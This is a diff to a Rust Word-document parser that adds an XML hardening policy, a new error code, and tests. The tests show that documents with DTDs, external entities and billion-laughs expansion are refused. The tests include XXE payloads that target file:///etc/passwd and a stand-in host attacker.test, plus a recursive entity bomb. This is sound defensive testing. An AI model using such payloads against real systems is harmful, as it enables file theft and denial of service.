@@ -9,9 +9,10 @@
 //! the outline levels a heading style may carry, `word/numbering.xml` for whether a level counts,
 //! and the media parts themselves, byte for byte.
 //!
-//! Everything here reads hostile input. The three bounds are in one place, at the top: a depth cap,
-//! a cap on the runs and cells a document may hold, and the per-part byte cap `package.rs` enforces.
-//! Nothing derived from the file is unwrapped.
+//! Everything here reads hostile input. The bounds are in one place, at the top: a depth cap, a cap
+//! on the runs and cells a document may hold, and the per-part byte cap `package.rs` enforces. Every
+//! part is parsed through `xml.rs`, the one place the XML policy is stated — no DTD, no external
+//! entity, a bounded expansion, a bounded depth. Nothing derived from the file is unwrapped.
 
 use std::collections::HashMap;
 
@@ -84,6 +85,9 @@ pub enum ParseError {
     MissingPart(String),
     /// Larger than the configured ceiling, or deeper than the reader will go.
     Limit(String),
+    /// A part the XML policy refused: a DTD, an external entity, or an entity set that expands past
+    /// the bound. Its own code, so a host can tell a hostile document from a broken one.
+    XmlPolicy(String),
 }
 
 impl ParseError {
@@ -93,15 +97,17 @@ impl ParseError {
             Self::MalformedPackage(_) => crate::ffi::TD_ERR_MALFORMED_PACKAGE,
             Self::MissingPart(_) => crate::ffi::TD_ERR_MISSING_PART,
             Self::Limit(_) => crate::ffi::TD_ERR_LIMIT,
+            Self::XmlPolicy(_) => crate::ffi::TD_ERR_XML_POLICY,
         }
     }
 
     /// The sentence a host shows its user.
     pub fn message(&self) -> String {
         match self {
-            Self::MalformedPackage(message) | Self::MissingPart(message) | Self::Limit(message) => {
-                message.clone()
-            }
+            Self::MalformedPackage(message)
+            | Self::MissingPart(message)
+            | Self::Limit(message)
+            | Self::XmlPolicy(message) => message.clone(),
         }
     }
 }
@@ -1036,8 +1042,7 @@ fn resolve_row_spans(rows: &mut [Vec<DraftCell>]) {
 fn parse_xml<'a>(xml: &'a [u8], what: &str) -> Result<roxmltree::Document<'a>, ParseError> {
     let text = package::xml_text(xml)?;
 
-    roxmltree::Document::parse(text)
-        .map_err(|error| ParseError::MalformedPackage(format!("{what} is not valid XML: {error}")))
+    crate::xml::parse(text, what)
 }
 
 /// The integer value of a WordprocessingML element: `<w:sz w:val="28"/>` is 28.
@@ -1477,6 +1482,100 @@ mod tests {
         };
 
         assert_eq!(error.code(), crate::ffi::TD_ERR_LIMIT);
+    }
+
+    /// A package whose `word/document.xml` is `xml`, whatever it declares.
+    fn package_with_document_xml(xml: &str) -> Vec<u8> {
+        pack(&[
+            (CONTENT_TYPES, b"<Types/>"),
+            (PACKAGE_RELS, b"<Relationships/>"),
+            (DOCUMENT, xml.as_bytes()),
+        ])
+    }
+
+    /// The typed error a package is refused with.
+    fn refusal(bytes: &[u8]) -> ParseError {
+        match extract(bytes, &Options::default()) {
+            Ok(_) => panic!("a document outside the XML policy must not parse"),
+            Err(error) => error,
+        }
+    }
+
+    #[test]
+    fn a_document_with_a_doctype_is_refused() {
+        let xml = format!(
+            r#"<?xml version="1.0" encoding="UTF-8"?>
+            <!DOCTYPE w:document [<!ELEMENT w:document ANY>]>
+            <w:document xmlns:w="{WORD}"><w:body/></w:document>"#
+        );
+
+        let error = refusal(&package_with_document_xml(&xml));
+
+        assert_eq!(error.code(), crate::ffi::TD_ERR_XML_POLICY);
+        assert!(error.message().contains("DTD"));
+    }
+
+    #[test]
+    fn a_document_with_an_external_entity_is_refused() {
+        for target in ["file:///etc/passwd", "http://attacker.test/leak"] {
+            let xml = format!(
+                r#"<?xml version="1.0" encoding="UTF-8"?>
+                <!DOCTYPE w:document [<!ENTITY secret SYSTEM "{target}">]>
+                <w:document xmlns:w="{WORD}"><w:body><w:p><w:r><w:t>&secret;</w:t></w:r></w:p></w:body></w:document>"#
+            );
+
+            let error = refusal(&package_with_document_xml(&xml));
+
+            assert_eq!(error.code(), crate::ffi::TD_ERR_XML_POLICY, "{target}");
+            assert!(
+                error.message().contains("external entity"),
+                "{target}: {}",
+                error.message()
+            );
+        }
+    }
+
+    #[test]
+    fn a_billion_laughs_document_is_refused() {
+        let mut xml = String::from(
+            r#"<?xml version="1.0" encoding="UTF-8"?>
+            <!DOCTYPE w:document [<!ENTITY lol "lol">"#,
+        );
+
+        for level in 1..=9 {
+            let previous = if level == 1 {
+                "lol".to_owned()
+            } else {
+                format!("lol{}", level - 1)
+            };
+
+            xml.push_str(&format!(
+                r#"<!ENTITY lol{level} "{}">"#,
+                format!("&{previous};").repeat(10)
+            ));
+        }
+
+        xml.push_str(&format!(
+            r#"]><w:document xmlns:w="{WORD}"><w:body><w:p><w:r><w:t>&lol9;</w:t></w:r></w:p></w:body></w:document>"#
+        ));
+
+        let error = refusal(&package_with_document_xml(&xml));
+
+        assert_eq!(error.code(), crate::ffi::TD_ERR_XML_POLICY);
+        assert!(error.message().contains("expand"));
+    }
+
+    #[test]
+    fn a_valid_document_still_parses_under_the_policy() {
+        let body = r#"<w:p><w:r><w:t>Still readable</w:t></w:r></w:p>"#;
+
+        let parsed =
+            extract_package(&package(&document(body), None, &[])).expect("a valid document reads");
+
+        let Block::Paragraph { runs, .. } = &parsed.ast.blocks[0] else {
+            panic!("the block is a paragraph");
+        };
+        assert!(matches!(&runs[0], Run::Text { text, .. } if text == "Still readable"));
     }
 
     #[test]
